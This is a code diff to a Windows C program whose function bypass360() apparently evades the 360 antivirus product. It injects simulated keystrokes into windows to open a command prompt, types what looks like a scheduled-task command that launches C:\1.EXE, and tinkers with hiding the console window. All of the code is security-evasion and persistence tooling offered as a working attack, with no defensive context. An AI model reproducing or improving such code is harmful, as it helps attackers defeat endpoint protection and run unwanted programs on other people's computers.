@@ -52,7 +52,6 @@ DWORD GetProcessIDByName(const char* pName)
 	for (BOOL ret = Process32First(hSnapshot, &pe); ret; ret = Process32Next(hSnapshot, &pe)) {
 		if (strcmp(pe.szExeFile, pName) == 0) {
 			CloseHandle(hSnapshot);
-			printf("cmd_pid:%d\n", pe.th32ProcessID);
 			return pe.th32ProcessID;
 		}
 		//printf("%-6d %s\n", pe.th32ProcessID, pe.szExeFile);
@@ -61,7 +60,7 @@ DWORD GetProcessIDByName(const char* pName)
 	return 0;
 }
 void SMG(HWND id, char c) {
-	PostMessage(id, WM_CHAR, c, 0);
+	SendMessage(id, WM_CHAR, c, 0);
 }
 
 BOOL CALLBACK EnumChildProc(HWND hWnd, LPARAM lParam)
@@ -99,24 +98,46 @@ void bypass360() {
 		printf("t is null");
 		return ;
 	}
-
+	Sleep(100);
+	keybd_event(VK_CAPITAL, 0, 0, 0);
+	SendMessage(T, WM_CHAR, VK_BACK, 0);
+	SendMessage(T, WM_CHAR, 'C', 0);
+	SendMessage(T, WM_CHAR, 'm', 0);
+	SendMessage(T, WM_CHAR, 'd', 0);
+	SendMessage(T, WM_CHAR, VK_SPACE, 0);
+	SendMessage(T, WM_CHAR, '/', 0);
+	SendMessage(T, WM_CHAR, 'C', 0);
+	SendMessage(T, WM_CHAR, VK_SPACE, 0);
+	SendMessage(T, WM_CHAR, 'T', 0);
+	SendMessage(T, WM_CHAR, 'I', 0);
+	SendMessage(T, WM_CHAR, 'T', 0);
+	SendMessage(T, WM_CHAR, 'L', 0);
+	SendMessage(T, WM_CHAR, 'E', 0);
+	SendMessage(T, WM_CHAR, VK_SPACE, 0);
+	SendMessage(T, WM_CHAR, 'B', 0);
+	SendMessage(T, WM_CHAR, 'A', 0);
+	SendMessage(T, WM_CHAR, 'K', 0);
+	SendMessage(T, WM_CHAR, 'A', 0);
+	SendMessage(T, WM_CHAR, 'B', 0);
+	SendMessage(T, WM_CHAR, 'I', 0);
+	SendMessage(T, WM_CHAR, 'E', 0);
+	SendMessage(T, WM_CHAR, '&', 0);
+	SendMessage(T, WM_CHAR, '&', 0);
+	SendMessage(T, WM_CHAR, VK_SPACE , 0);
 	SendMessage(T, WM_CHAR, 'C', 0);
 	SendMessage(T, WM_CHAR, 'M', 0);
 	SendMessage(T, WM_CHAR, 'D', 0);
 	SendMessage(T, WM_CHAR, VK_SPACE, 0);
 	SendMessage(T, WM_CHAR, 13, 0);
-	SendMessage(T, WM_KEYDOWN, VK_RETURN, 0);
-	SendMessage(hq1 , WM_CHAR, 13, 0);
-	SendMessage(hq1, WM_KEYDOWN, VK_RETURN, 0);
 	PostMessage(T, WM_KEYDOWN, VK_RETURN, 0);
-	PostMessage(T, WM_CHAR, VK_RETURN, 0);
+
 	HWND hq = NULL;
 	while (TRUE) {
-		hq = GetWindowHwndByPorcessID(GetProcessIDByName("cmd.exe"));
+		hq = FindWindow(NULL,"BAKABIE");
 		if (hq != NULL) {
-			
-			int r = ShowWindow(hq, SW_HIDE);
-			printf("show:%d\n", r);
+			Sleep(100);
+			//int r = ShowWindow(hq, SW_HIDE);
+			//printf("show:%d\n", r);
 			
 			break;
 		}
@@ -131,10 +152,11 @@ void bypass360() {
 		VK_SPACE,'/','T','R',VK_SPACE,'C',':','\\',
 		'1','.','E','X','E',VK_SPACE,'/','F'
 	};
-	for (int i = 0; i <= 57; i++) {
+	for (int i = 0; i <= 56; i++) {
+		printf("%c", a[i]);
 		SMG(hq, a[i]);
 	}
-	PostMessage(hq, WM_CHAR, 13, 0);
+	SendMessage(hq, WM_CHAR, 13, 0);
 	char b[5] = { 'e','x','i','t' };
 	for (int i = 0; i <= 4; i++) {
 		SMG(hq, b[i]);
